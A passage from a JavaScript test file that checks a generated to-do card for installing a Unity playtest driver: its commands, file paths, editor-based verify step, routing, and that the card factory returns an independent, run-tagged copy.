  for (const [command] of [UN.UNITY_PIPELINE.driver('state'), UN.UNITY_PIPELINE.driver('input', { steps: [] }), UN.UNITY_PIPELINE.driver('screenshot')]) {
    assert.ok(card.details.includes(`\`${command}`), command);
  }
  assert.match(card.details, /playtest input --steps <json>/);
  assert.match(card.details, /scripted inputs/);
  assert.match(card.details, /JSON/);
  assert.match(card.details, /Unity Test Framework/);
  assert.doesNotMatch(card.details, /execute_custom_tool|playtest_driver|PlaytestDriverTool/, 'no MCP for Unity custom tool left');
  // The error start() shows while the driver is missing.
  assert.ok(card.details.includes(`${U.NO_DRIVER_ERROR} (Unity command 'playtest state' failed: Command Not Found`));
  assert.ok(card.details.includes(card.text));

  assert.ok(card.files.every((f) => f.startsWith('Assets/LunaPlaytest/')), 'every file under Assets/LunaPlaytest/');
  for (const f of ['Assets/LunaPlaytest/PlaytestDriver.cs', 'Assets/LunaPlaytest/PlaytestInput.cs', 'Assets/LunaPlaytest/Editor/PlaytestCommands.cs']) {
    assert.ok(card.files.includes(f), f);
  }
  assert.ok(card.files.some((f) => f.includes('/Tests/PlayMode/')));

  // Verify runs against the open editor: batch mode cannot open a project the editor holds.
  assert.match(card.verify, /^unity test .*PlayMode/);
  assert.match(card.verify, /`unity test --help`/);
  assert.doesNotMatch(card.verify, /-batchmode|-projectPath/);
  assert.match(card.details, /Do NOT use `Unity -batchmode -projectPath \.`/);

  assert.ok(card.acceptance.some((a) => a.includes(U.PLAYTEST_DRIVER_GUARD)));
  assert.ok(card.acceptance.some((a) => a.includes('unity command playtest state')));
  // A scripts-only card: never routed to the scene worker.
  assert.equal(Scene.isSceneCard(card), false);

  // It survives the to-do store unchanged (no field is cut).
  const stored = normalizeTodo({ ...card, at: 1 });
  for (const key of ['text', 'details', 'verify', 'size', 'model', 'effort']) assert.equal(stored[key], card[key], key);
  assert.deepEqual(stored.acceptance, card.acceptance);
  assert.deepEqual(stored.files, card.files);
});

test('playtestDriverCard() is a fresh copy, tagged with the run', () => {
  const card = U.playtestDriverCard({ runId: 'abc123' });
  assert.deepEqual(card.tags, [runTag('abc123')]);
  card.files.push('Assets/Evil.cs');
  card.acceptance.length = 0;
  assert.equal(U.PLAYTEST_DRIVER_CARD.files.includes('Assets/Evil.cs'), false);
  assert.ok(U.PLAYTEST_DRIVER_CARD.acceptance.length > 0);
  assert.equal('tags' in U.playtestDriverCard(), false);
});
